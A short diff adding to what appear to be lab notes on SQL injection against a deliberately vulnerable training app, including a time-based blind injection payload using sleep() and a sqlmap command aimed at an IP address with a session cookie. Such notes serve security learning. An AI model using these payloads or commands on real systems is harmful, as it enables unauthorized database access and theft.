@@ -60,6 +60,10 @@ python ./sqlmap.py -u "http://161.35.202.77/vulnerabilities/sqli/?id=1&Submit=Su
 1' and if(substr((database()),1,1) = 'a' , sleep(3), 1) #
 ```
 
+## Automated bling sqli with sqlmap
 
+```sh
+python ./sqlmap.py -u "http://161.35.202.77/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" --cookie="PHPSESSID=d4ool8gsr78mnro6cas6mrlf35; security=low"
+```
 
 
